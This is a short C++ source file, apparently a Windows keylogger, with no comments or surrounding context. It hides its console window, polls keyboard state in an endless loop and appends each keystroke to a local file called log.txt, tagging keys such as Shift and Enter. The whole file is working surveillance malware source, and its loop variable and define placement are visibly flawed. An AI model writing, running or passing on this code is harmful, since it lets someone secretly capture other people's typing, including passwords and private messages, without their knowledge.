#include <iostream>
#include <Windows.h>
#define _CRT_SECURE_NO_WARNINGS

int SaveKey(int _key, const char* file);

int main() {
    FreeConsole();

    char i;

    while (true) {
        Sleep(10);
        for (i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                SaveKey(i, "log.txt");
            }
        }
    }
    return 0;
}

int SaveKey(int _key, const char* file) {
    std::cout << _key << std::endl;

    Sleep(10);

    FILE* OUTPUT_FILE;

    if (fopen_s(&OUTPUT_FILE, file, "a+") != 0) {
        std::cerr << "Error opening file" << std::endl;
        return -1;
    }
    switch (_key) {
    case VK_SHIFT:
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
        break;
    case VK_BACK:
        fprintf(OUTPUT_FILE, "%s", "[BACK]");
        break;
    case VK_LBUTTON:
        fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
        break;
    case VK_RETURN:
        fprintf(OUTPUT_FILE, "%s", "[RETURN]");
        break;
    case VK_ESCAPE:
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
        break;
    default:
        fprintf(OUTPUT_FILE, "%c", _key);
        break;
    }

    fclose(OUTPUT_FILE);

    return 0;
}
